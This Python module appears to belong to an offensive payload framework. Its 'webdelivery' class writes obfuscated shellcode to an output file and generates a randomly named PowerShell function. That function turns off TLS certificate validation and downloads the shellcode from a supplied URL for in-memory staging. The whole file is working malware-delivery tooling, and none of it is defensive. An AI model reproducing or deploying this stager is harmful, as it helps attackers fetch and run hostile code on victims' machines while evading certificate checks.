import random
import string
import json
from ps1.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
            self.listLength = len(shellcode)
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)


    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}')

    def codeblock(self) -> str:
        if self.type == 'bytes':
            return f"""
function {self.name} {{
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
    $obfuscated = (New-Object System.Net.WebClient).DownloadData("{self.url}")
    return $obfuscated
}}
"""
        elif self.type == 'str':
            return f"""
function {self.name} {{
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
    $obfuscated = [System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData("{self.url}"))
    return $obfuscated
}}
"""
        elif self.type == 'list':
            return f"""
function {self.name} {{
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
    $obfuscated = [System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData("{self.url}")) -split '\\n';
    return $obfuscated;
}}
"""